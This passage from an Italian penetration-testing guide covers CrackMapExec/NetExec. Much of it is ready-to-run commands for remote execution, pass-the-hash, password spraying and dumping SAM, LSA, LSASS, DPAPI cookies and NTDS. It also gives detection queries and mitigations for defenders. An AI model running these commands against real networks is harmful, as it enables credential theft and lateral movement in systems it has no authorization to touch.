  -u 'john' -p 'Password123!'
```

Esecuzione:

```bash
nxc winrm 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  -X 'whoami'
```

Se l'accesso è valido e ti serve una shell interattiva, passa a [Evil-WinRM](https://hackita.it/articoli/evilwinrm):

```bash
evil-winrm -i 10.10.10.20 \
  -u 'john' \
  -p 'Password123!'
```

## WMI

```bash
nxc wmi 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!'
```

```bash
nxc wmi 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  -x 'whoami'
```

WMI usa RPC/DCOM e può essere bloccato da firewall host, namespace ACL o hardening DCOM anche quando SMB authentication funziona.

## RDP

```bash
nxc rdp 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!'
```

Screenshot dopo autenticazione, esclusivamente se previsto dalle regole d'ingaggio:

```bash
nxc rdp 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  --screenshot \
  --screentime 5
```

Se NLA è disabilitata, puoi acquisire la sola schermata di login senza autenticarti:

```bash
nxc rdp 10.10.10.20 --nla-screenshot
```

Uno screenshot può contenere nomi, banner legali, sessioni o dati personali. Trattalo come evidenza sensibile e raccogli soltanto ciò che è necessario.

## MSSQL

Per una guida completa al servizio consulta [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql).

```bash
nxc mssql 10.10.10.15 \
  -u 'sa' -p 'Password123!' \
  --local-auth
```

### Query SQL

```bash
nxc mssql 10.10.10.15 \
  -u 'sa' -p 'Password123!' \
  --local-auth \
  -q 'SELECT name FROM master.dbo.sysdatabases;'
```

### Esecuzione tramite `xp_cmdshell`

```bash
nxc mssql 10.10.10.15 \
  -u 'sa' -p 'Password123!' \
  --local-auth \
  -x 'whoami'
```

Il comando usa `xp_cmdshell` e funziona solo se l'account SQL possiede i privilegi necessari e la funzionalità è disponibile. L'output `(Pwn3d!)` nel protocollo MSSQL indica capacità di amministrazione/esecuzione nel contesto SQL rilevato, non implica automaticamente `NT AUTHORITY\SYSTEM`.

***

# Fase 8 — File Operations e Share Triage

## Upload di un File

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --put-file '/tmp/evidence.txt' '\Windows\Temp\evidence.txt'
```

## Download di un File

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --get-file '\Windows\Temp\evidence.txt' '/tmp/evidence.txt'
```

Le versioni moderne di NetExec usano **percorso locale seguito da percorso remoto** per `--put-file` e **percorso remoto seguito da percorso locale** per `--get-file`. Molte cheat sheet vecchie riportano un ordine differente.

## Spider di una Share

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  --spider 'C$' \
  --pattern 'txt'
```

## Spider Plus

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spider_plus
```

Per scaricare i file individuati, dopo aver verificato scope, estensioni e volume:

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spider_plus \
  -o DOWNLOAD_FLAG=True
```

Non utilizzare download indiscriminati su share aziendali. Prima restringi la ricerca per estensione, directory, dimensione e pertinenza; evita di raccogliere documenti personali o interi repository quando basta dimostrare l'accesso.

Per operazioni manuali e verifica puntuale consulta [smbclient](https://hackita.it/articoli/smbclient).

***

# Fase 9 — Windows LAPS

Windows LAPS riduce il rischio di riutilizzo della stessa password locale tra host diversi. Se l'account controllato possiede il diritto di leggere la password gestita, NetExec può recuperarla e usarla nel workflow autorizzato.

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'helpdesk' -p 'Password123!' \
  --laps
```

Se il nome dell'amministratore locale è personalizzato:

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'helpdesk' -p 'Password123!' \
  --laps 'LocalAdminName'
```

La possibilità di leggere una password LAPS non è necessariamente una vulnerabilità: può essere un'autorizzazione operativa prevista. Il finding nasce quando il diritto è assegnato a soggetti eccessivi, ereditato in modo incontrollato o utilizzabile per raggiungere sistemi fuori dal ruolo dell'utente.

***

# Fase 10 — Credential Dumping

Questa fase richiede privilegi elevati e genera evidenze sensibili. Prima di eseguirla chiarisci nelle regole d'ingaggio:

* quali host possono essere sottoposti a credential dumping;
* se è ammessa l'estrazione degli hash o solo la prova di accesso;
* dove conservare i risultati;
* quanto tempo mantenerli;
* se sono esclusi Domain Controller, sistemi HR, backup o asset critici.

Per il contesto metodologico consulta [credential dumping](https://hackita.it/articoli/credential-dumping) e [Impacket](https://hackita.it/articoli/impacket).

## Dump SAM

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --sam
```

Fallback legacy simile a `secretsdump`:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --sam secdump
```

Il SAM contiene gli hash degli account locali. Sono necessari privilegi amministrativi locali o un percorso equivalente previsto dal tool.

## Dump LSA Secrets

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --lsa
```

Fallback:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --lsa secdump
```

LSA Secrets può esporre secret di servizi, cached domain logons e altre credenziali gestite dal sistema.

## Dump LSASS con Lsassy

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  -M lsassy
```

Alternativa con Nanodump:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  -M nanodump
```

Il modulo storico `mimikatz` è documentato come deprecato. Non costruire nuovi workflow basati su quel modulo.

## Dump DPAPI

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --dpapi
```

Solo credenziali utente, evitando la raccolta dei secret di sistema:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --dpapi nosystem
```

Raccolta cookie dei browser:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --dpapi cookies
```

I cookie possono equivalere a sessioni attive e comportano un impatto superiore al semplice hash locale. Usali soltanto quando esplicitamente autorizzato.

## Backup Operators / `SeBackupPrivilege`

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'backup.user' -p 'Password123!' \
  -M backup_operator
```

Il modulo verifica e sfrutta il percorso consentito da `SeBackupPrivilege` per accedere a hive e database protetti. L'utente non deve necessariamente essere membro degli Administrators locali se possiede effettivamente il privilegio di backup richiesto.

## Dump NTDS.dit / DCSync

Su un Domain Controller e con privilegi adeguati:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --ntds
```

Solo account abilitati:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --ntds \
  --enabled
```

Metodo Volume Shadow Copy:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --ntds vss
```

Singolo utente:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --ntds \
  --user 'CORP/krbtgt'
```

Moduli alternativi:

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  -M ntdsutil
```

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  -M ntds-dump-raw \
  -o TARGET=NTDS
```

La replica tramite DRSUAPI è collegata alla tecnica [DCSync](https://hackita.it/articoli/dcsync). Non serve necessariamente “copiare fisicamente” `NTDS.dit`: il metodo predefinito può usare le API di replica.

## Altri Secret Applicativi

NetExec include moduli per artefatti specifici. Prima verifica che il modulo esista nella release installata:

```bash
nxc smb -L
```

Esempi:

```bash
# Token Broker / WAM
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  -M wam
```

```bash
# Credenziali Veeam
nxc smb 10.10.10.30 \
  -u 'administrator' -p 'Password123!' \
  -M veeam
```

```bash
# PuTTY
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  -M putty
```

```bash
# Comandi con credenziali presenti negli Event Log 4688/Sysmon 1
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  -M eventlog_creds
```

Questi moduli hanno prerequisiti e impatti diversi. Non eseguirli in massa senza prima leggere le opzioni:

```bash
nxc smb -M <nome_modulo> --options
```

***

# Fase 11 — Moduli e Controlli di Vulnerabilità

La sintassi moderna è:

```bash
nxc <protocollo> -L
nxc <protocollo> -M <modulo>
nxc <protocollo> -M <modulo> --options
nxc <protocollo> <target> -M <modulo> -o CHIAVE=valore
```

## Elencare i Moduli SMB

```bash
nxc smb -L
```

## Mostrare le Opzioni

```bash
nxc smb -M spider_plus --options
```

## Eseguire un Modulo

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spider_plus
```

I nomi dei moduli sono **case-sensitive o normalizzati in base alla release**. Non copiare automaticamente esempi storici come `-M Zerologon` o `-M PetitPotam`: verifica sempre il nome restituito da `-L`.

## Spooler Service

```bash
nxc smb 10.10.10.10 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M spooler
```

Il servizio Print Spooler raggiungibile può essere un prerequisito per coercion e relay, ma il solo fatto che sia attivo non dimostra una compromissione.

## WebClient / WebDAV

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  -M webdav
```

Il WebClient attivo può influire su catene di autenticazione coercibile. Valuta sempre protocolli, firma, channel binding, EPA e destinazione del relay.

## MS17-010 e Altri Check

La disponibilità del modulo dipende dalla release:

```bash
nxc smb -L | grep -i 'ms17\|zerologon\|petit\|coerce'
```

Poi usa il nome realmente mostrato:

```bash
nxc smb 10.10.10.10 -M <modulo_verificato>
```

Un check automatico può produrre falsi positivi o falsi negativi. Conferma la versione, la patch e la condizione tecnica prima di assegnare una severità.

***

# Fase 12 — Raccolta Output e Evidenze

Il vecchio esempio:

```bash
crackmapexec smb 10.10.10.0/24 ... --output output.csv
```

non è una sintassi portabile tra CME e NetExec. NetExec moderno fornisce il flag generale `--log` per registrare la singola esecuzione:

```bash
nxc --log smb-validation.txt smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!'
```

In alternativa, `tee` salva esattamente ciò che appare nel terminale:

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  2>&1 | tee smb-validation.txt
```

Per estrarre solo gli host con privilegi amministrativi:

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  2>&1 | tee smb-validation.txt

grep -F '(Pwn3d!)' smb-validation.txt
```

NetExec mantiene anche database e log nella propria directory utente. Percorsi e formati possono cambiare tra release: individua la configurazione effettiva con:

```bash
nxc --help
nxcdb --help 2>/dev/null || true
find ~/.nxc -maxdepth 3 -type f 2>/dev/null
```

Non inserire password, hash o cookie in ticket non cifrati, screenshot pubblici o repository Git.

***

# Migrazione da CrackMapExec a NetExec

## Tabella di Compatibilità

| CME / guida legacy       | NetExec consigliato                                    | Nota                                            |
| ------------------------ | ------------------------------------------------------ | ----------------------------------------------- |
| `crackmapexec`           | `nxc`                                                  | Cambio del binario                              |
| `crackmapexec smb ...`   | `nxc smb ...`                                          | Workflow base quasi identico                    |
| `--kerberos`             | `-k`                                                   | Autenticazione Kerberos con credenziali fornite |
| Ticket implicito         | `--use-kcache`                                         | Usa la ccache indicata da `KRB5CCNAME`          |
| `--output file.csv`      | `nxc --log file.txt ...` oppure `2>&1 \| tee file.txt` | `--output` è legacy; `--log` è il flag corrente |
| `-M Zerologon`           | `nxc smb -L` e nome corrente                           | Verifica nome e disponibilità del modulo        |
| `-M PetitPotam`          | `nxc smb -L` e nome corrente                           | Moduli e opzioni cambiano                       |
| `--put-file source dest` | `--put-file locale remoto`                             | Ordine documentato nelle release moderne        |
| `--get-file source dest` | `--get-file remoto locale`                             | Non invertire i path                            |
| PFX non supportato       | `--pfx-cert`, `--pfx-pass`                             | Funzione moderna di NetExec                     |
| Certificato PEM          | `--pem-cert`, `--pem-key`                              | Supporto moderno                                |

## Migrazione Minima

```bash
# Vecchio
crackmapexec smb targets.txt -u users.txt -p 'Spring2024!'

# Nuovo
nxc smb targets.txt -u users.txt -p 'Spring2026!'
```

```bash
# Vecchio esempio Kerberos
crackmapexec smb dc01.corp.local -u john --kerberos

# Nuovo con password
nxc smb dc01.corp.local -d corp.local \
  -u john -p 'Password123!' -k
```

```bash
# Nuovo con ccache
export KRB5CCNAME=/tmp/john.ccache
nxc smb dc01.corp.local --use-kcache
```

## Perché Tenere Separati i Due Articoli

Questa pagina intercetta chi cerca:

```text
CrackMapExec
CrackMapExec commands
CrackMapExec Pwn3d
CrackMapExec SMB
CrackMapExec install
CrackMapExec vs NetExec
```

La guida [NetExec](https://hackita.it/articoli/netexec) deve invece posizionarsi sulle funzionalità correnti e sulle release moderne. Collegare le due pagine chiaramente riduce la confusione e trasforma il traffico legacy in un percorso di aggiornamento.

***

# Workflow Operativo 1 — Da Credenziale Utente a Mappa del Dominio

Scenario: possiedi una credenziale di dominio a basso privilegio ottenuta durante un assessment autorizzato.

## 1. Identifica DC, dominio e SMB Signing

```bash
nxc smb 10.10.10.0/24
```

## 2. Valida la Credenziale senza Eseguire Comandi

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  2>&1 | tee validazione-smb.txt
```

## 3. Controlla le Share

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  --shares
```

## 4. Enumera Active Directory via LDAP

```bash
nxc ldap dc01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  --users
```

```bash
nxc ldap dc01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  --groups
```

## 5. Cerca AS-REP Roastable e SPN

```bash
nxc ldap dc01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  --asreproast asrep.txt
```

```bash
nxc ldap dc01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  --kerberoasting tgs.txt
```

## 6. Genera i Dati BloodHound

```bash
nxc ldap dc01.corp.local -d corp.local \
  -u 'john' -p 'Password123!' \
  --bloodhound \
  --collection All
```

## 7. Individua Privilegi Locali

```bash
nxc smb 10.10.10.0/24 -d corp.local \
  -u 'john' -p 'Password123!' \
  2>&1 | tee admin-check.txt

grep -F '(Pwn3d!)' admin-check.txt
```

Questo workflow privilegia discovery e validazione prima di passare a esecuzione o dump.

***

# Workflow Operativo 2 — Password Locale Riutilizzata

Scenario: possiedi l'hash NT di un amministratore locale da una workstation autorizzata.

```bash
nxc smb workstations.txt \
  -u 'Administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c' \
  --local-auth \
  2>&1 | tee local-admin-reuse.txt
```

Estrai gli host interessati:

```bash
grep -F '(Pwn3d!)' local-admin-reuse.txt
```

Su un solo target di prova:

```bash
nxc smb 10.10.10.21 \
  -u 'Administrator' \
  -H '8846f7eaee8fb117ad06bdd830b7586c' \
  --local-auth \
  -x 'whoami'
```

Impatto da documentare:

```text
Riutilizzo della stessa credenziale amministrativa locale
→ accesso amministrativo a più workstation
→ lateral movement
→ potenziale raccolta di ulteriori credenziali
```

Mitigazione principale: Windows LAPS, account tiering, blocco NTLM dove possibile, firewall host e riduzione degli amministratori locali.

***

# Workflow Operativo 3 — Da Admin Locale a Credenziale di Dominio

Esegui questo percorso solo se autorizzato a raccogliere credenziali.

## 1. Conferma i Privilegi

```bash
nxc smb 10.10.10.21 \
  -u 'Administrator' -p 'LocalPassword!' \
  --local-auth
```

## 2. Verifica Sessioni e Utenti Connessi

```bash
nxc smb 10.10.10.21 \
  -u 'Administrator' -p 'LocalPassword!' \
  --local-auth \
  --loggedon-users
```

## 3. Raccogli Soltanto l'Evidenza Concordata

```bash
nxc smb 10.10.10.21 \
  -u 'Administrator' -p 'LocalPassword!' \
  --local-auth \
  --lsa
```

oppure, se previsto:

```bash
nxc smb 10.10.10.21 \
  -u 'Administrator' -p 'LocalPassword!' \
  --local-auth \
  -M lsassy
```

## 4. Valida la Nuova Identità Senza Spraying Indiscriminato

```bash
nxc smb dc01.corp.local -d corp.local \
  -u 'svc_backup' -p 'RecoveredPassword!'
```

Non testare automaticamente la credenziale su tutta la rete se non serve a dimostrare l'impatto.

***

# Workflow Operativo 4 — Kerberos-Only

Scenario: NTLM è limitato e possiedi una ccache valida.

```bash
export KRB5CCNAME=/tmp/admin.ccache
```

```bash
nxc smb ws01.corp.local --use-kcache --shares
```

```bash
nxc ldap dc01.corp.local --use-kcache --users
```

```bash
nxc winrm srv01.corp.local --use-kcache -X 'whoami'
```

Prerequisiti:

```text
DNS funzionante
FQDN coerenti con gli SPN
clock sincronizzato
realm corretto
ccache leggibile
servizio compatibile con Kerberos
```

Per approfondire ticket, SPN e autenticazione consulta [Kerberos](https://hackita.it/articoli/kerberos), [Rubeus](https://hackita.it/articoli/rubeus) e [Impacket](https://hackita.it/articoli/impacket).

***

# OPSEC: Quanto Rumore Produce CME / NetExec?

NetExec non è “stealth” per definizione. Il rumore dipende dal comando.

|           Attività | Rumore indicativo | Artefatti frequenti           |
| -----------------: | ----------------- | ----------------------------- |
|    Banner scan SMB | Basso/medio       | Connessioni 445, log firewall |
| Enumerazione share | Medio             | Sessioni SMB, accesso share   |
|  Password spraying | Alto              | Numerosi 4625/4771, lockout   |
|   LDAP enumeration | Medio             | Query LDAP, volume anomalo    |
|      Kerberoasting | Medio             | Richieste TGS 4769            |
|    AS-REP Roasting | Medio             | Richieste 4768/4771 anomale   |
|      WMI execution | Alto              | WMI activity, 4688, RPC       |
|           `atexec` | Alto              | Task temporanei, 4698         |
|          `smbexec` | Alto              | Servizi temporanei, 4697/7045 |
|       SAM/LSA dump | Alto              | Remote Registry, accessi hive |
|         LSASS dump | Molto alto        | Accesso a LSASS, EDR alerts   |
|        NTDS/DCSync | Critico           | Replication rights, 4662      |

## Ridurre il Rumore senza Nascondere l'Attività

In un penetration test “OPSEC” significa ridurre impatto e falsi allarmi non necessari, non eludere deliberatamente il SOC fuori dalle regole concordate.

```bash
# Intervallo tra tentativi durante uno spray autorizzato
nxc smb 10.10.10.10 -d corp.local \
  -u users.txt -p 'Spring2026!' \
  --jitter 5-10
```

Altre misure:

* usa una lista target delimitata, non intere subnet per abitudine;
* controlla prima la password policy;
* usa `--no-bruteforce` quando username e password sono coppie uno-a-uno;
* interrompi dopo aver dimostrato l'impatto minimo necessario;
* forza il metodo di esecuzione per sapere quali artefatti produrrai;
* evita dump di massa quando basta una singola evidenza;
* comunica al SOC le finestre di test previste, se richiesto dall'engagement.

***

# Detection: Come Rilevare CrackMapExec e NetExec

Non esiste un singolo “Event ID di CrackMapExec”. La detection efficace correla autenticazioni, protocolli, destinazioni, processi, servizi, task e accessi alle directory.

## Eventi Windows Principali

| Event ID | Significato                     | Collegamento al workflow                   |
| -------: | ------------------------------- | ------------------------------------------ |
|     4624 | Logon riuscito                  | Validazione credenziali e lateral movement |
|     4625 | Logon fallito                   | Password spraying o credenziali errate     |
|     4648 | Logon con credenziali esplicite | Alcuni flussi di accesso remoto            |
|     4672 | Privilegi speciali assegnati    | Sessioni amministrative                    |
|     4688 | Nuovo processo                  | Command execution e tool lanciati          |
|     4697 | Servizio installato             | `smbexec` e service-based execution        |
|     4698 | Scheduled task creato           | `atexec` e task-based execution            |
|     4768 | Richiesta TGT                   | Kerberos, AS-REP analysis                  |
|     4769 | Richiesta TGS                   | Kerberoasting e accesso ai servizi         |
|     4771 | Kerberos pre-auth fallita       | Spray Kerberos, errori password            |
|     4776 | Validazione credenziali NTLM    | Autenticazione NTLM                        |
|     5140 | Accesso a una share             | Enumerazione SMB                           |
|     5145 | Accesso dettagliato a share     | File e directory consultati                |
|     4662 | Operazione su oggetto AD        | DCSync se auditing/SACL adeguati           |

## Detection Password Spraying con Splunk

```spl
index=wineventlog EventCode=4625
| bucket _time span=10m
| stats dc(TargetUserName) AS utenti,
        count AS tentativi,
        values(TargetUserName) AS elenco_utenti
  BY _time, IpAddress, WorkstationName
| where utenti >= 10 AND tentativi >= 10
```

Questo cerca un singolo indirizzo che fallisce su molti utenti in una finestra breve. Adatta soglie e campi alla tua normalizzazione.

## Detection di Molti Host con la Stessa Identità

```spl
index=wineventlog EventCode=4624 LogonType=3
| bucket _time span=15m
| stats dc(Computer) AS host_destinazione,
        values(Computer) AS host,
        count AS accessi
  BY _time, TargetUserName, IpAddress
| where host_destinazione >= 8
```

Il comportamento può essere legittimo per scanner, amministrazione centralizzata o deployment. Applica allowlist basate sul ruolo.

## Service-Based Execution

```spl
index=wineventlog (EventCode=4697 OR EventCode=7045)
| stats values(ServiceName) AS servizi,
        values(ImagePath) AS path,
        values(AccountName) AS account
  BY Computer, _time
```

Cerca servizi temporanei, nomi insoliti, binari da directory scrivibili o processi avviati da account non amministrativi abituali.

## Scheduled Task Remoto

```spl
index=wineventlog EventCode=4698
| search TaskContent="*cmd.exe*" OR TaskContent="*powershell.exe*"
| table _time, Computer, SubjectUserName, TaskName, TaskContent
```

## Kerberoasting

```spl
index=wineventlog EventCode=4769
| stats count,
        dc(ServiceName) AS servizi,
        values(ServiceName) AS spn
  BY IpAddress, TargetUserName, TicketEncryptionType
| where servizi >= 5
```

Non usare la sola presenza di RC4 come prova automatica: ambienti legacy possono generarlo legittimamente.

## DCSync

```spl
index=wineventlog EventCode=4662
| search Properties="*Replicating Directory Changes*"
      OR Properties="*Replicating Directory Changes All*"
      OR Properties="*Replicating Directory Changes In Filtered Set*"
| table _time, Computer, SubjectUserName, ObjectName, Properties
```

L'evento 4662 richiede auditing Directory Service Access e SACL adatte. Senza questa configurazione il DC può non produrre l'evidenza necessaria.

## Microsoft Sentinel / KQL: Failures su Molti Utenti

```kusto
SecurityEvent
| where EventID == 4625
| summarize Attempts=count(),
            Users=dcount(TargetUserName),
            UserList=make_set(TargetUserName, 50)
  by IpAddress, bin(TimeGenerated, 10m)
| where Users >= 10 and Attempts >= 10
```

## Detection SMB Signing e Relay Surface

La ricognizione NetExec può produrre numerose connessioni TCP/445 brevi verso molti host. Sul network monitoring cerca:

```text
singola sorgente → molti host TCP/445
negoziazione SMB senza successivo uso applicativo
query LDAP concentrate verso un DC
accessi /certsrv o endpoint amministrativi da workstation insolite
```

Per la catena completa consulta [NTLM relay](https://hackita.it/articoli/ntlm-relay).

***

# Mitigazioni

## 1. Usa Windows LAPS

Genera password amministrative locali uniche per host e limita rigorosamente chi può leggerle.

## 2. Riduci gli Amministratori Locali

* rimuovi Domain Users e gruppi ampi;
* usa gruppi separati per workstation e server;
* applica tiering amministrativo;
* evita account Domain Admin sulle workstation.

## 3. Proteggi SMB

* abilita SMB signing dove compatibile;
* disabilita SMBv1;
* limita TCP/445 tra segmenti;
* blocca le workstation dal contattarsi lateralmente quando non necessario;
* monitora accessi a share amministrative.

## 4. Proteggi NTLM

* misura prima l'uso reale;
* limita o disabilita NTLM progressivamente;
* configura Extended Protection for Authentication dove supportata;
* impedisci relay con signing e channel binding;
* rimuovi protocolli di coercion non necessari.

## 5. Hardening WinRM, WMI e RDP

* limita WinRM alle management subnet;
* usa gruppi `Remote Management Users` strettamente controllati;
* abilita NLA per RDP;
* richiedi MFA tramite gateway dove possibile;
* limita DCOM/RPC con firewall host;
* monitora processi remoti e PowerShell.

## 6. Proteggi le Credenziali

* abilita Credential Guard dove compatibile;
* attiva protezione LSA;
* evita sessioni privilegiate su host non fidati;
* usa Protected Users per account adeguati;
* separa account utente e account amministrativi;
* applica gMSA per i servizi.

## 7. Proteggi Active Directory

* rimuovi SPN da account utente quando non necessari;
* usa password lunghe e gestite per service account;
* disabilita `DONT_REQ_PREAUTH` salvo casi documentati;
* limita i diritti di replica;
* monitora modifiche ad ACL, deleghe e gruppi privilegiati;
* verifica periodicamente percorsi con [BloodHound](https://hackita.it/articoli/bloodhound).

***

# Troubleshooting

## `STATUS_LOGON_FAILURE`

Cause comuni:

```text
password errata
dominio errato
account bloccato o disabilitato
account locale testato come dominio
NTLM vietato
orario/Kerberos errato
```

Prova il dominio esplicito:

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!'
```

Oppure account locale:

```bash
nxc smb 10.10.10.20 \
  -u 'Administrator' -p 'LocalPassword!' \
  --local-auth
```

## `STATUS_ACCOUNT_LOCKED_OUT`

Interrompi immediatamente i tentativi e informa il referente. Non continuare con altre password.

## Autenticazione Valida ma Nessun `(Pwn3d!)`

La credenziale è valida, ma non possiede i privilegi richiesti per l'esecuzione remota o il metodo è bloccato. Prova attività non invasive come:

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'john' -p 'Password123!' \
  --shares
```

## `(Pwn3d!)` ma `-x` Fallisce

Possibili cause:

```text
WMI bloccato
Task Scheduler non raggiungibile
Service Control Manager filtrato
UAC remote restrictions
EDR/application control
share ADMIN$ non disponibile
firewall RPC dinamico
```

Forza un metodo per isolare l'errore:

```bash
nxc smb 10.10.10.20 -d corp.local \
  -u 'administrator' -p 'Password123!' \
  --exec-method atexec \
  -x 'whoami'
```

## Kerberos: `KRB_AP_ERR_SKEW`

Sincronizza l'orario:

```bash
sudo ntpdate dc01.corp.local
```

oppure usa il servizio di sincronizzazione previsto dal tuo sistema.

## Kerberos: `KDC_ERR_S_PRINCIPAL_UNKNOWN`

Usa il FQDN corretto e verifica lo SPN:

```bash
getent hosts ws01.corp.local
```

Evita l'IP quando il flusso richiede un service principal basato sul nome.

## `--use-kcache` Non Trova il Ticket

```bash
echo "$KRB5CCNAME"
klist
ls -l "$KRB5CCNAME"
```

## LDAP Non Risponde

Verifica porte, DNS e TLS:

```bash
nmap -sV -p 389,636,3268,3269 10.10.10.10
```

Poi consulta [porta 389 LDAP](https://hackita.it/articoli/porta-389-ldap) e [ldapsearch](https://hackita.it/articoli/ldapsearch).

## Modulo Non Trovato

```bash
nxc smb -L | grep -i '<termine>'
nxc smb -M '<modulo>' --options
```

La guida che stai leggendo potrebbe riferirsi a una release differente.

## `--sam` o `--lsa` Falliscono

Prova il metodo legacy soltanto come fallback:

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --sam secdump
```

```bash
nxc smb 10.10.10.20 \
  -u 'administrator' -p 'Password123!' \
  --local-auth \
  --lsa secdump
```

## MSSQL `xp_cmdshell` Permission Denied

L'autenticazione SQL è riuscita, ma l'account non possiede l'autorizzazione a eseguire `xp_cmdshell`, oppure la funzionalità è disabilitata. Verifica ruoli e configurazione senza assumere che il tool possa abilitarla automaticamente.

***

# Cheat Sheet Finale

| Obiettivo            | Comando moderno                                                        |
| -------------------- | ---------------------------------------------------------------------- |
| Scan SMB             | `nxc smb 10.10.10.0/24`                                                |
| Relay list           | `nxc smb 10.10.10.0/24 --gen-relay-list relay.txt`                     |
| Null session         | `nxc smb 10.10.10.10 -u '' -p ''`                                      |
| Guest                | `nxc smb 10.10.10.10 -u guest -p ''`                                   |
| Validare credenziali | `nxc smb TARGET -d DOMINIO -u USER -p PASS`                            |
| Account locale       | `nxc smb TARGET -u USER -p PASS --local-auth`                          |
| Pass-the-Hash        | `nxc smb TARGET -u USER -H NTHASH`                                     |
| Kerberos             | `nxc smb HOST.DOMINIO -d DOMINIO -u USER -p PASS -k`                   |
| Usa ccache           | `nxc smb HOST.DOMINIO --use-kcache`                                    |
| Share                | `nxc smb TARGET -u USER -p PASS --shares`                              |
| Utenti               | `nxc ldap DC -d DOMINIO -u USER -p PASS --users`                       |
| Gruppi               | `nxc ldap DC -d DOMINIO -u USER -p PASS --groups`                      |
| Password policy      | `nxc smb DC -d DOMINIO -u USER -p PASS --pass-pol`                     |
| RID brute            | `nxc smb TARGET -u USER -p PASS --rid-brute`                           |
| AS-REP Roast         | `nxc ldap DC -d DOMINIO -u USER -p PASS --asreproast out.txt`          |
| Kerberoast           | `nxc ldap DC -d DOMINIO -u USER -p PASS --kerberoasting out.txt`       |
| BloodHound           | `nxc ldap DC -d DOMINIO -u USER -p PASS --bloodhound --collection All` |
| CMD remoto           | `nxc smb TARGET -u ADMIN -p PASS -x 'whoami'`                          |
| PowerShell remoto    | `nxc smb TARGET -u ADMIN -p PASS -X 'Get-Process'`                     |
| Forza WMI            | `nxc smb TARGET ... --exec-method wmiexec -x 'whoami'`                 |
| Forza MMC/DCOM       | `nxc smb TARGET ... --exec-method mmcexec -x 'whoami'`                 |
| Forza Task           | `nxc smb TARGET ... --exec-method atexec -x 'whoami'`                  |
| Forza servizio       | `nxc smb TARGET ... --exec-method smbexec -x 'whoami'`                 |
| WinRM                | `nxc winrm TARGET -u USER -p PASS -X 'whoami'`                         |
| Query MSSQL          | `nxc mssql TARGET -u USER -p PASS -q 'SELECT @@VERSION;'`              |
| MSSQL command        | `nxc mssql TARGET -u sa -p PASS --local-auth -x 'whoami'`              |
| Upload               | `nxc smb TARGET ... --put-file locale remoto`                          |
| Download             | `nxc smb TARGET ... --get-file remoto locale`                          |
| Spider               | `nxc smb TARGET ... --spider 'C$' --pattern 'txt'`                     |
| Spider Plus          | `nxc smb TARGET ... -M spider_plus`                                    |
| LAPS                 | `nxc smb TARGET ... --laps`                                            |
| SAM                  | `nxc smb TARGET ... --sam`                                             |
| LSA                  | `nxc smb TARGET ... --lsa`                                             |
| LSASS                | `nxc smb TARGET ... -M lsassy`                                         |
| DPAPI                | `nxc smb TARGET ... --dpapi`                                           |
| NTDS                 | `nxc smb DC ... --ntds --enabled`                                      |
| Elenco moduli        | `nxc smb -L`                                                           |
